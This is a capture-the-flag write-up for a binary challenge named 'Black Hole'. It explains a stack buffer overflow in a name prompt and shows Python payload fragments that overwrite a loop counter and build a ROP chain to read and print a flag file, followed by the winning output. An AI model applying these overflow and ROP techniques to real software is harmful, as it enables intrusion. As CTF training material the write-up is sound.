# Black Hole

Points: 200

Description: We flew too close to the black hole! Help us escape!

Creator: nsnc

# Solve

In this program, you are trapped by a black hole, and need to find a way to escape it.
```
Throttle: MAX
Gravity: 10
O                         =>                       |
```

There is a buffer overflow when inputting the captain's name, and since there is no canary and PIE is disabled, it is easy to exploit.
```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

The tricky thing about this challenge is that the buffer overflow will overwrite the counter pointing to the offset where the next character will be written to. Writing the correct value there will prevent any infinite loops or unexpected behavior:
```python
payload = b"A" * 140
payload += p64(
    0x90
)  # Overwriting a counter. Must be the correct value to pervent loops or crashes.
```

After that, we can create a simple ropchain using availible gadgets.
```python
payload += p64(pop_rdi)  # Sets up argument to readfile
payload += p64(flag_address)  # Pointer to './flag.txt'
payload += p64(read_file) # Address of readfile (returns a pointer to the content of a file in rax)
payload += p64(print_rax) # mov rdi, rax; call puts
```

```
Throttle: 3
Gravity: 17
O     =>                                           |
> You lose AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb8!
Sorry, you died!
pctf{th1s_l1ttle_man0uver_just_c0st_us_51_y34r5}
```
